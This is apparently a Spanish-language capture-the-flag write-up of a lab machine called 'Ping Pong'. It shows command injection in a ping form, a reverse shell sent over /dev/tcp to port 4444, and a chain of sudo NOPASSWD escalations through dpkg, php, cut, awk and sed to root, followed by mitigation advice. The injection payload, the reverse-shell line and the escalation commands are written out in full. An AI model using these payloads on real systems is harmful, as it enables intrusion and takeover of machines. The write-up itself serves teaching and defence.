# Ping Pong

## Resumen Ejecutivo

Este laboratorio de nivel medio constituye un ejercicio integral de explotación y escalada de privilegios. El objetivo es demostrar cómo vulnerabilidades encadenadas, incluyendo inyección de comandos y configuraciones inseguras de permisos `sudo`, pueden permitir a un atacante obtener acceso privilegiado completo al sistema.

## Descripción

**Nivel:** Medio  
**Objetivo:** Obtener acceso como usuario root a través de escalada de privilegios  
**Vulnerabilidades Clave:** Inyección de comandos, configuración inadecuada de `sudo` (NOPASSWD), binarios explotables

---

## 1. Reconocimiento Inicial

El laboratorio comienza con un escaneo de puertos utilizando `nmap`:

![alt text](img/1-nmap.png)

El escaneo revela los puertos 80, 443 y 5000 abiertos, en los cuales corren servicios HTTP. Al verificar cada uno de estos servicios, no se encuentra nada relevante hasta el puerto 5000, el cual aloja un sistema de verificación de conectividad mediante `ping`.

---

## 2. Explotación Inicial: Inyección de Comandos

### 2.1 Identificación de la Vulnerabilidad

Al acceder a la interfaz web en el puerto 5000, se identifica un formulario que ejecuta comandos `ping`:

![alt text](img/2-httpPingId.png)

Mediante pruebas de distintos operadores, se descubre que el carácter `;` actúa como separador de instrucciones, permitiendo la ejecución de comandos adicionales de forma encadenada. Esto se confirma ejecutando el comando `id`:

![alt text](img/2-httpID.png)

### 2.2 Obtención de Shell Reversa

Se ejecuta el siguiente comando para obtener una shell reversa:

```bash
172.17.0.1; /bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
```

Este comando envía una shell interactiva a la máquina atacante en el puerto 4444.

**Nota:** En la máquina atacante, es necesario establecer un listener con el comando `nc -lnvp 4444`

### 2.3 Estabilización de la Shell

Se procede a estabilizar la shell obtenida mediante `tty`:

![alt text](img/5-TtyFreddy.png)

---

## 3. Escalada de Privilegios Encadenada

### 3.1 Análisis de Usuarios Disponibles

Se examina el archivo `/etc/passwd` para identificar usuarios con permisos de shell:

![alt text](img/3-CatEtcPasswd.png)

Se identifican los siguientes usuarios: `freddy` (usuario actual), `bobby`, `gladys`, `chocolatito`, `theboss` y `root`.

### 3.2 De Freddy a Bobby

Se verifica los permisos de `freddy` mediante `sudo -l`:

![alt text](img/4-SudoFreddy.png)

El resultado indica que `freddy` puede ejecutar el binario `dpkg` como `bobby` sin contraseña. Según GTFObins, este binario puede explotarse con la flag `-l` para abrir una shell:

```bash
sudo -u bobby dpkg -l
```

Dentro del paginador, se ejecuta:

```
!/bin/bash
```

Esto abre una shell con permisos de `bobby`:

![alt text](img/6-Bobby.png)

### 3.3 De Bobby a Gladys

Se verifica nuevamente los permisos con `sudo -l`:

![alt text](img/7-BobbySudo.png)

Se revela que `bobby` puede ejecutar el binario `php` como `gladys` sin contraseña. Explotando esta capacidad:

```bash
sudo -u gladys php -r 'system("/bin/bash -i");'
```

Esto proporciona acceso como `gladys`:

![alt text](img/8-Gladys.png)

### 3.4 De Gladys a Chocolatito

Investigando los directorios, se identifica un archivo interesante en `/opt` que presumiblemente contiene credenciales de `chocolatito`:

![alt text](img/9-gladysPasswd.png)

Al revisar los permisos de `gladys` con `sudo -l`, se descubre que puede utilizar el binario `cut` como `chocolatito` sin contraseña:

```bash
sudo -u chocolatito cut -d: -f1 /opt/archivo_con_contraseña
```

Mediante esta exploración, se obtiene la contraseña de `chocolatito` y se inicia sesión como este usuario:

![alt text](img/10-Chocolate.png)

### 3.5 De Chocolatito a Theboss

Revisando nuevamente los permisos con `sudo -l`:

![alt text](img/11-ChocolateSudo.png)

Se revela que `chocolatito` puede ejecutar `awk` como `theboss` sin contraseña. Según GTFObins, la explotación es:

![alt text](img/11-swk.png)

Al ejecutar el comando correspondiente, se obtiene acceso como `theboss`:

![alt text](img/12-theBoos+.png)

### 3.6 De Theboss a Root

Se verifica los permisos de `theboss`:

![alt text](img/13-bossSudo.png)

Se descubre que `theboss` puede ejecutar `sed` como `root` sin contraseña. GTFObins proporciona un método de explotación:

![alt text](img/14-sed.png)

Al ejecutar este comando, se obtiene finalmente acceso como `root`:

![alt text](img/root.png)

---

## 4. Resumen de Vulnerabilidades Explotadas

| Vulnerabilidad | Ubicación | Impacto |
|---|---|---|
| Inyección de Comandos | Puerto 5000 - Servicio ping | Ejecución arbitraria de comandos |
| Configuración insegura de `sudo` | Sudoers configuration | Escalada de privilegios sin contraseña |
| Binarios explotables (dpkg, php, cut, awk, sed) | Múltiples ubicaciones | Bypass de restricciones de permisos |

---

## 5. Recomendaciones de Mitigación

### 5.1 Validación de Entrada (Inyección de Comandos)
**Vulnerabilidad:** El servicio en el puerto 5000 no valida ni sanitiza adecuadamente la entrada del usuario.

**Recomendación:** Implementar un whitelist estricto de caracteres permitidos. Validar que la entrada contiene únicamente direcciones IP válidas, rechazando caracteres especiales como `;`, `|`, `&`, `>`, `<`, etc. Utilizar funciones seguras de llamada a procesos que no requieran interpretación de shell (ej: `execve()` en C en lugar de `system()`).

### 5.2 Configuración Insegura de Sudo (NOPASSWD)
**Vulnerabilidad:** Múltiples entradas en la configuración `sudo` están configuradas con `NOPASSWD`, permitiendo la escalada de privilegios sin autenticación.

**Recomendación:** Eliminar todos los permisos `NOPASSWD` innecesarios. Si es imprescindible delegar privilegios, requerir autenticación mediante contraseña. Auditar regularmente el archivo `/etc/sudoers` para identificar privilegios excesivos. Considerar el uso de soluciones alternativas como `sudo` con plugin PAM o gestión de acceso basada en roles (RBAC).

### 5.3 Binarios Explotables mediante GTFObins
**Vulnerabilidad:** Binarios como `dpkg`, `php`, `cut`, `awk` y `sed` tienen capacidades de ejecución de comandos que pueden ser explotadas cuando se ejecutan con privilegios elevados.

**Recomendación:** Restringir la delegación de binarios que tengan capacidades peligrosas. Para herramientas como `dpkg`, limitar a operaciones específicas mediante banderas de `sudo` más restrictivas. Considerar el uso de alternativas seguras como `fakeroot` para operaciones que requieren privilegios. Auditar regularmente las capacidades de binarios críticos y mantener registros de su uso.

### 5.4 Almacenamiento de Credenciales en Archivos Locales
**Vulnerabilidad:** Las contraseñas se almacenan en archivos accesibles con permisos de lectura inadecuados en `/opt/`.

**Recomendación:** Nunca almacenar credenciales en texto plano en archivos locales. Implementar un gestor de secretos centralizado (ej: HashiCorp Vault, AWS Secrets Manager). Cifrar cualquier dato sensible almacenado localmente. Aplicar principios de menor privilegio en los permisos de archivos que contienen información sensible.

### 5.5 Escalada Encadenada de Privilegios
**Vulnerabilidad:** La arquitectura del laboratorio permite múltiples puntos de escalada que, cuando se encadenan, conducen a compromiso total del sistema.

**Recomendación:** Implementar una estrategia de defensa en profundidad. Reducir el número de usuarios del sistema a los esenciales. Establecer límites estrictos en la delegación de privilegios. Implementar logging y monitoreo continuo de cambios en la configuración de `sudo` y ejecución de binarios sensibles. Realizar auditorías de seguridad periódicas del sistema de control de acceso.


